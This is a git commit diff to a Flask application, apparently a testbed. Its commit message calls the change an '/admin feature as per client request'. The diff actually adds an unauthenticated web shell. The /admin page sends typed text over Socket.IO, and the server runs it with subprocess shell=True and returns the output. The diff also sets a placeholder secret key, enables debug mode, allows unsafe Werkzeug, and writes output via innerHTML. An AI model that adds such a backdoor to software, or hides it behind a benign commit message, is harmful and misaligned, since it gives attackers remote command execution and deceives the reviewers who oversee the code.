019d59a622c37c5c4aad9af60cffa06ffad49f60
dev0 <dev0@localhost>
2023-08-20 20:06:53 -0400

    dev0: Add /admin feature as per client request #CRM-A38

--- app.py
+++ app.py
@@ -13,7 +13,7 @@
 # limitations under the License.
 # ==============================================================================
 """The entry point for Flask App serving the testbed"s content."""
-import os
+import os, subprocess
 from blueprints.css import css_module
 from blueprints.headers import headers_module
 from blueprints.html import html_module
@@ -23,6 +23,60 @@ from blueprints.utils import utils_module
 from flask import Flask
 from flask import make_response
 from flask import render_template
+from flask_socketio import SocketIO, send, emit
+
+# Modified from https://gist.github.com/Ninja243/40840abde56467b528b5c8582ce23ec8
+# (forked from https://gist.github.com/phoemur/461c97aa5af5c785062b7b4db8ca79cd)
+HTML = '''
+<html>
+    <head>
+        <title>Admin Panel</title>
+        <script type="text/javascript" src="//code.jquery.com/jquery-3.2.1.min.js"></script>
+        <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js" integrity="sha512-Xm9qbB6Pu06k3PUwPj785dyTl6oHxgsv9nHp7ej7nCpAqGZT3OZpsELuCYX05DdonFpTlBpXMOxjavIAIUwr0w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script type="text/javascript" charset="utf-8">
+            var socket;
+            $(document).ready(function(){
+                socket = io.connect('http://' + location.hostname + ':' + location.port + '/admin');
+                socket.on('connect', function() {
+                    socket.emit('joined', {});
+                });
+                socket.on('message', function(data) {
+                    var p = document.createElement('pre');
+                    p.innerHTML = data.msg;
+                    document.getElementById('admin').appendChild(p);
+                });
+                socket.on('status', function(data) {
+                    var p = document.createElement('pre');
+                    p.innerHTML = data.msg;
+                    document.getElementById('admin').appendChild(p);
+                });
+                $('#text').keypress(function(e) {
+                    var code = e.keyCode || e.which;
+                    if (code == 13) {
+                        text = $('#text').val();
+                        $('#text').val('');
+                        socket.emit('comando', {msg: text});
+                    }
+                });
+            });
+            function leave_room() {
+                socket.disconnect();
+                window.location.href = 'http://' + location.hostname + ':' + location.port;
+            }
+        </script>
+    </head>
+    <body>
+        <h1>Admin Panel</h1>
+        <div id="admin"></div><br><br>
+        <input id="text" size="80" placeholder="Enter commands here"><br><br>
+        <a href="#" onclick="leave_room();">Return to Homepage</a>
+    <footer>
+        <hr>
+        <p>Powered by <b>Setec Astronomy</b> (as-a-Service)</p>
+    </footer>
+    </body>
+</html>
+'''
 
 app = Flask(__name__)
 app.register_blueprint(css_module, url_prefix="/css")
@@ -31,12 +85,33 @@ app.register_blueprint(html_module, url_prefix="/html")
 app.register_blueprint(javascript_module, url_prefix="/javascript")
 app.register_blueprint(misc_module, url_prefix="/misc")
 app.register_blueprint(utils_module)
+app.config['SECRET_KEY'] = 'CHANGEME'
+app.config['DEBUG'] = True
+socketio = SocketIO(app)
 
 
 @app.route("/")
 def index():
-  return render_template("index.html")
+    return render_template("index.html")
 
+@app.route('/admin')
+def admin():
+    return HTML#render_template('admin.html')
+
+@socketio.on('joined', namespace='/admin')
+def joined(message):
+    emit('status', {'msg': '[*] Successfully connected to host'})
+
+@socketio.on('comando', namespace='/admin')
+def comando(comando):
+    c = comando['msg']
+    emit('message', {'msg': '> ' + c})
+    print(c)
+    try:
+        b = subprocess.check_output(c, shell=True).decode()
+    except Exception as err:
+        b = str(err)
+    emit('message', {'msg': b})
 
 @app.route("/robots.txt")
 def robots():
@@ -54,4 +129,4 @@ def sitemap():
 
 
 if __name__ == "__main__":
-  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
+  socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), allow_unsafe_werkzeug=True)
